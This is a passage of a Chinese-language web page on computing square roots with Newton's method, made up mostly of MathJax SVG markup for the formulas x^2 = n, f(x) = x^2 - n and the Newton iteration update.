415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(0,30.8)"><path data-c="221A" d="M95 178Q89 178 81 186T72 200T103 230T169 280T207 309Q209 311 212 311H213Q219 311 227 294T281 177Q300 134 312 108L397 -77Q398 -77 501 136T707 565T814 786Q820 800 834 800Q841 800 846 794T853 782V776L620 293L385 -193Q381 -200 366 -200Q357 -200 354 -197Q352 -195 256 15L160 225L144 214Q129 202 113 190T95 178Z"></path></g><rect width="600" height="60" x="853" y="770.8"></rect></g><g data-mml-node="mstyle" transform="translate(3358.6,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mo" transform="translate(3914.3,0)"><path data-c="27FA" d="M1438 514Q1438 525 1454 525Q1459 525 1462 525T1467 525T1471 524T1473 523T1475 520T1477 517T1480 512Q1517 438 1578 381T1689 300T1785 263Q1802 258 1802 250T1793 239T1756 228T1698 204Q1554 134 1480 -12Q1476 -21 1473 -22T1458 -24Q1438 -24 1438 -17Q1438 -13 1443 0Q1478 69 1529 123L1539 133H318L328 123Q379 69 414 0Q419 -13 419 -17Q419 -24 399 -24Q388 -24 385 -23T377 -12Q332 77 253 144T72 237Q62 240 59 242T56 250T59 257T70 262T89 268T119 278T160 296Q303 366 377 512Q382 522 385 523T401 525Q419 524 419 515Q419 510 414 500Q379 431 328 377L318 367H1539L1529 377Q1496 412 1467 458T1438 514ZM274 173H1583L1593 181Q1632 211 1710 250Q1709 251 1692 259T1647 283T1593 319L1583 327H930L927 328L602 327H274L264 319Q225 289 147 250Q148 249 165 241T210 217T264 181L274 173Z"></path></g><g data-mml-node="mstyle" transform="translate(5772.3,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="msup" transform="translate(6328.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(7614.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(8670.2,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mstyle" transform="translate(9270.2,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mo" transform="translate(9826,0)"><path data-c="27FA" d="M1438 514Q1438 525 1454 525Q1459 525 1462 525T1467 525T1471 524T1473 523T1475 520T1477 517T1480 512Q1517 438 1578 381T1689 300T1785 263Q1802 258 1802 250T1793 239T1756 228T1698 204Q1554 134 1480 -12Q1476 -21 1473 -22T1458 -24Q1438 -24 1438 -17Q1438 -13 1443 0Q1478 69 1529 123L1539 133H318L328 123Q379 69 414 0Q419 -13 419 -17Q419 -24 399 -24Q388 -24 385 -23T377 -12Q332 77 253 144T72 237Q62 240 59 242T56 250T59 257T70 262T89 268T119 278T160 296Q303 366 377 512Q382 522 385 523T401 525Q419 524 419 515Q419 510 414 500Q379 431 328 377L318 367H1539L1529 377Q1496 412 1467 458T1438 514ZM274 173H1583L1593 181Q1632 211 1710 250Q1709 251 1692 259T1647 283T1593 319L1583 327H930L927 328L602 327H274L264 319Q225 289 147 250Q148 249 165 241T210 217T264 181L274 173Z"></path></g><g data-mml-node="mstyle" transform="translate(11684,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(12239.8,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(12789.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(13178.8,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(13750.8,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(14417.6,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(15473.3,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(16704.1,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(17704.3,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(18582.1,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(19637.9,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path></g></g></g></svg></mjx-container></span> 我们将 <span class="math inline"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="13.721ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 6064.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(939,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(1511,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2177.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(3233.6,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(4464.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(5464.6,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container></span>
代入牛顿法的迭代公式中，可以得到以下的更新规则： <span class="math display"><mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -2.172ex;" xmlns="http://www.w3.org/2000/svg" width="33.894ex" height="5.76ex" role="img" focusable="false" viewBox="0 -1586.1 14980.9 2546.1"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="TeXAtom" transform="translate(605,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g><g data-mml-node="mo" transform="translate(2080.4,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(3136.2,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(4257.4,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mfrac" transform="translate(5257.6,0)"><g data-mml-node="mrow" transform="translate(385.2,710)"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(939,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1838,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mrow" transform="translate(220,-710)"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z"></path></g><g data-mml-node="mo" transform="translate(636,289) scale(0.707)"><path data-c="2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"></path></g></g><g data-mml-node="mo" transform="translate(880.5,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(1269.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(2168.4,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><rect width="2757.4" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(8532.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(9588.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 